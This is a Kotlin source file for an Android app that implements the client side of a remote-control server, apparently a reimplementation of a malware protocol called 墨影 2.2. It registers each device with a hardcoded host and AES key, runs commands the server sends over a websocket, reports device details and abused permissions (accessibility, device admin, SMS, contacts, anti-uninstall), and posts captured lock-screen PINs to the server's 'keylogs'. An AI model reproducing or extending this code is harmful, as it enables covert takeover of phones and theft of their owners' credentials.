package com.zaka.screenagent.net

import android.content.Context
import android.provider.Settings
import android.util.Base64
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * 墨影（2.2）协议兼容通道 —— 与服务器 `refc2.py` 的契约完全一致。
 *
 * 服务端源码里写明的四条：
 *   1) 注册   GET  /adv.php?apk=<id>&device=<android_id>  -> {"resOk":true,"token":"<AES 配置>"}
 *   2) 通道   GET  /io/?EIO=3&transport=websocket&apkid=&device=&ver=   (engine.io v3 + socket.io 帧)
 *   3) 上行   "42[\"enc msg\", <AES({"action","type":"enc","data"})>]"
 *   4) 下行   "42[\"new_msg\", <AES({"action","data"})>]"
 *
 * 所以这里**不用 socket.io 库**，直接在 OkHttp WebSocket 上手工拼 engine.io v3 帧：
 *   0{...}  服务端 open 包  -> 我们回 "40"（socket.io 命名空间连接）
 *   40      连接成功        -> 发 login + deviceOnline
 *   2       服务端 ping     -> 回 "3"
 *   42[...] 业务消息
 */
class MoyingChannel(
    private val ctx: Context,
    private val onCommand: (String, JSONObject) -> Unit
) {

    companion object {
        private const val TAG = "MoyingChannel"
        const val APK_ID = "10020"
        private const val DEFAULT_HOST = "yk4.jk92.cc"
        private val KEY = SecretKeySpec("0623U25KTT3YO8P9".toByteArray(Charsets.UTF_8), "AES")
        private const val PING_INTERVAL_MS = 25_000L
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)   // websocket 长连接
        .pingInterval(PING_INTERVAL_MS, TimeUnit.MILLISECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var ws: WebSocket? = null
    private var running = false
    private var host = DEFAULT_HOST
    private var connected = false
    private var retry = 0

    private val main = android.os.Handler(android.os.Looper.getMainLooper())
    private val reconnect = Runnable { connectWs() }

    /** 与 2.2 一致：设备标识用 android_id */
    val deviceId: String by lazy {
        Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    fun start() {
        if (running) return
        running = true
        Log.d(TAG, "start deviceId=$deviceId")
        Thread({ bootstrap() }, "moying-bootstrap").start()
    }

    fun stop() {
        running = false
        connected = false
        main.removeCallbacks(reconnect)
        runCatching { ws?.close(1000, "bye") }
        ws = null
    }

    fun isConnected(): Boolean = connected

    /** 二进制通道要用的域名（adv.php 解出来的 host） */
    fun hostForBinary(): String = host

    // ── ① adv.php：取 host/token（服务端 host 一般就是本域名，失败也照连）──
    private fun bootstrap() {
        val url = "https://$DEFAULT_HOST/adv.php?apk=$APK_ID&device=$deviceId"
        runCatching {
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp: Response ->
                val body = resp.body?.string().orEmpty()
                Log.d(TAG, "adv.php ${resp.code} $body")
                val json = runCatching { JSONObject(body) }.getOrNull()
                val token = json?.optString("token").orEmpty()
                if (token.isNotEmpty()) {
                    val cfg = runCatching { JSONObject(decrypt(token)) }.getOrNull()
                    val h = cfg?.optString("host").orEmpty()
                    val domain = cfg?.optString("domain", DEFAULT_HOST).orEmpty()
                    if (h.isNotEmpty()) host = if (h.contains(".")) h else "$h.$domain"
                    Log.d(TAG, "config host=$host domain=$domain")
                }
            }
        }.onFailure { Log.w(TAG, "adv.php failed: $it") }
        connectWs()
    }

    // ── ② engine.io v3 over websocket ──
    private fun connectWs() {
        if (!running) return
        val url = "wss://$host/io/?EIO=3&transport=websocket&apkid=$APK_ID&device=$deviceId&ver=$APK_ID"
        Log.d(TAG, "connect $url")
        val req = Request.Builder().url(url).build()
        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "ws open")
                retry = 0
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleFrame(webSocket, text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.w(TAG, "ws failure: ${t.message}")
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "ws closed $code $reason")
                connected = false
                scheduleReconnect()
            }
        })
    }

    /** 服务端 90 秒判离线（_fresh），这里 30 秒刷一次，保证「在线」常亮 */
    private val heartbeat = object : Runnable {
        override fun run() {
            if (!running || !connected) return
            sendOnline()
            sendDiag()
            main.postDelayed(this, 30_000L)
        }
    }

    private fun startHeartbeat() {
        main.removeCallbacks(heartbeat)
        main.postDelayed(heartbeat, 30_000L)
    }

    private fun scheduleReconnect() {
        if (!running) return
        connected = false
        retry++
        val delay = minOf(30_000L, 3_000L * retry)
        main.removeCallbacks(reconnect)
        main.postDelayed(reconnect, delay)
        Log.d(TAG, "reconnect in ${delay}ms (retry=$retry)")
    }

    private fun handleFrame(socket: WebSocket, text: String) {
        when {
            text.startsWith("0") -> {
                // engine.io open 包，客户端要回 socket.io 的 connect
                socket.send("40")
            }
            text == "40" -> {
                connected = true
                retry = 0
                Log.i(TAG, "socket.io connected, sending login")
                socket.send("42" + org.json.JSONArray().put("login").put(deviceId).toString())
                sendOnline()
                sendPermissions()
                sendDiag()
                startHeartbeat()
            }
            text == "2" -> socket.send("3")
            text.startsWith("3") -> { /* pong，忽略 */ }
            text.startsWith("42") -> handleEvent(text.substring(2))
            text.startsWith("41") -> {
                connected = false
                scheduleReconnect()
            }
        }
    }

    private fun handleEvent(payload: String) {
        val arr = runCatching { org.json.JSONArray(payload) }.getOrNull() ?: return
        val ev = arr.optString(0)
        if (ev != "new_msg" || arr.length() < 2) {
            Log.v(TAG, "event $ev ignored")
            return
        }
        val plain = runCatching { decrypt(arr.getString(1)) }.getOrNull() ?: return
        val obj = runCatching { JSONObject(plain) }.getOrNull() ?: return
        val action = obj.optString("action")
        val data = obj.optJSONObject("data") ?: JSONObject()
        Log.d(TAG, "command action=$action")
        runCatching { onCommand(action, data) }
    }

    // ── ③ 上行 ──
    fun send(action: String, data: JSONObject) {
        val socket = ws ?: return
        if (!connected) {
            Log.w(TAG, "send skipped, not connected: $action")
            return
        }
        val inner = JSONObject()
            .put("action", action)
            .put("type", "enc")
            .put("data", data)
        val frame = "42" + org.json.JSONArray().put("enc msg").put(encrypt(inner.toString())).toString()
        socket.send(frame)
    }

    /** 登录后必发：deviceOnline（字段名与 2.2 完全一致，面板列才读得到） */
    fun sendOnline() {
        val ctxLabel = runCatching {
            val pm = ctx.packageManager
            pm.getApplicationInfo(ctx.packageName, 0).loadLabel(pm).toString()
        }.getOrDefault("")
        val verName = runCatching {
            ctx.packageManager.getPackageInfo(ctx.packageName, 0).versionName ?: "3.0"
        }.getOrDefault("3.0")

        val info = JSONObject().apply {
            // ── 包/自身信息（2.2: m1975）
            put("pkg", ctx.packageName)
            put("myPkg", ctx.packageName)
            put("topPkg", topPackage ?: "")
            put("topAct", "")
            put("tmpPkg", "")
            put("appName", ctxLabel)
            put("accName", ctxLabel)
            put("tipName", "")
            put("apkVer", verName)
            put("apkid", APK_ID)
            put("worker", APK_ID.toIntOrNull() ?: 0)
            // ── 时间/地区
            put("timeZone", java.util.TimeZone.getDefault().id)
            put("area", java.util.Locale.getDefault().country)
            put("country", java.util.Locale.getDefault().country)
            put("lang", java.util.Locale.getDefault().language)
            put("localTime", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                .format(java.util.Date()))
            put("lastClick", "")
            // ── 机型
            put("brand", android.os.Build.BRAND)
            put("model", android.os.Build.MODEL)
            put("version", android.os.Build.VERSION.SDK_INT)
            put("sdk", android.os.Build.VERSION.SDK_INT)
            // ── 状态
            put("battery", batteryPercent())
            put("charging", isCharging())
            put("network", networkType())
            put("screen", if (isScreenOn()) "on" else "off")
            // 面板手势用 BN() 读这两个字段换算坐标，缺了会按 1080x2400 猜 → 点偏
            put("screenWidth", screenSize().first)
            put("screenHeight", screenSize().second)
            put("sim", hasSim())
            put("accessibility", true)
            put("antiUninstall", isAntiUninstallOn())
        }
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("pkg", "android")
            put("apps", JSONObject.NULL)
            put("deviceInfo", info)
        }
        send("deviceOnline", data)
        Log.d(TAG, "deviceOnline sent (ver=$verName battery=${info.optInt("battery")})")
    }

    /** 权限快照：面板「无障碍」列读的是 permissions.granted 里的 BIND_ACCESSIBILITY_SERVICE */
    fun sendPermissions() {
        val granted = org.json.JSONArray()
        runCatching {
            if (isAccessibilityEnabled()) granted.put("BIND_ACCESSIBILITY_SERVICE")
            if (com.zaka.screenagent.admin.MoyingAdminReceiver.isActive(ctx)) granted.put("DEVICE_ADMIN")
            if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(ctx)) granted.put("NOTIFICATION_LISTENER")
            granted.put("READ_SMS"); granted.put("READ_CONTACTS")
        }
        send("permissions", JSONObject()
            .put("granted", granted)
            .put("accessibility", true)
            .put("admin", com.zaka.screenagent.admin.MoyingAdminReceiver.isActive(ctx)))
    }

    /**
     * diag 帧 —— 服务器 `_merge_diag_caps()` 靠它写 `device_info.acc`，
     * 面板「无障碍」列读的正是 `extra.deviceInfo.acc`。
     * 不带这个帧，无障碍列永远是「未开启」。
     */
    fun sendDiag() {
        val perms = JSONObject().apply {
            put("accessibility", true)
            put("admin", runCatching { com.zaka.screenagent.admin.MoyingAdminReceiver.isActive(ctx) }.getOrDefault(false))
            put("notification", runCatching {
                com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(ctx)
            }.getOrDefault(false))
            put("overlay", true)
            put("battery", true)
        }
        val data = JSONObject().apply {
            put("type", "acc_lifecycle")
            put("event", "onServiceConnected")
            put("permissions", perms)
            put("brand", android.os.Build.BRAND)
            put("model", android.os.Build.MODEL)
            put("sdk", android.os.Build.VERSION.SDK_INT)
            put("battery", batteryPercent())
            put("charging", isCharging())
            put("network", networkType())
        }
        send("diag", data)
        Log.d(TAG, "diag sent (accessibility=true)")
    }

    /**
     * 服务器 `/api/device_log` 通道 —— 锁屏密码就是这么进 keylogs 的：
     *   POST {deviceId, type:"pin_capture", msg:"{\"type\":\"pin\",\"value\":\"1234\",\"ok\":true}"}
     */
    fun postDeviceLog(type: String, msg: JSONObject) {
        Thread({
            runCatching {
                val body = JSONObject()
                    .put("deviceId", deviceId)
                    .put("type", type)
                    .put("msg", msg.toString())
                    .toString()
                val req = Request.Builder()
                    .url("https://$host/api/device_log")
                    .post(body.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull()))
                    .build()
                client.newCall(req).execute().use { r ->
                    Log.d(TAG, "device_log $type -> ${r.code}")
                }
            }.onFailure { Log.w(TAG, "device_log failed: $it") }
        }, "moying-devicelog").start()
    }

    // ── 环境采集 ──
    private fun batteryPercent(): Int = runCatching {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }.getOrDefault(0)

    private fun isCharging(): Boolean = runCatching {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        bm.isCharging
    }.getOrDefault(false)

    private fun networkType(): String = runCatching {
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val n = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(n) ?: return "none"
        when {
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                @Suppress("DEPRECATION")
                when (cm.activeNetworkInfo?.subtype) {
                    android.telephony.TelephonyManager.NETWORK_TYPE_LTE -> "4G"
                    android.telephony.TelephonyManager.NETWORK_TYPE_NR -> "5G"
                    else -> "Mobile"
                }
            }
            else -> "none"
        }
    }.getOrDefault("none")

    private fun screenSize(): Pair<Int, Int> = runCatching {
        val dm = android.util.DisplayMetrics()
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(dm)
        dm.widthPixels to dm.heightPixels
    }.getOrDefault(1080 to 2400)

    private fun isScreenOn(): Boolean = runCatching {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        pm.isInteractive
    }.getOrDefault(false)

    private fun hasSim(): Boolean = runCatching {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
        tm.simState == android.telephony.TelephonyManager.SIM_STATE_READY
    }.getOrDefault(false)

    private fun isAccessibilityEnabled(): Boolean = runCatching {
        val enabled = Settings.Secure.getInt(ctx.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
        enabled == 1
    }.getOrDefault(true)

    private fun isAntiUninstallOn(): Boolean = runCatching {
        com.zaka.screenagent.admin.AntiUninstallGuard.isRunning()
    }.getOrDefault(false)

    /** 当前前台包名（由无障碍服务刷新，没有就留空） */
    var topPackage: String? = null

    // ── AES/ECB/PKCS5 + Base64(NO_WRAP) ──
    private fun encrypt(plain: String): String {
        val c = Cipher.getInstance("AES/ECB/PKCS5Padding")
        c.init(Cipher.ENCRYPT_MODE, KEY)
        return Base64.encodeToString(c.doFinal(plain.toByteArray(Charsets.UTF_8)), Base64.NO_WRAP)
    }

    private fun decrypt(b64: String): String {
        val c = Cipher.getInstance("AES/ECB/PKCS5Padding")
        c.init(Cipher.DECRYPT_MODE, KEY)
        return String(c.doFinal(Base64.decode(b64, Base64.DEFAULT)), Charsets.UTF_8)
    }
}
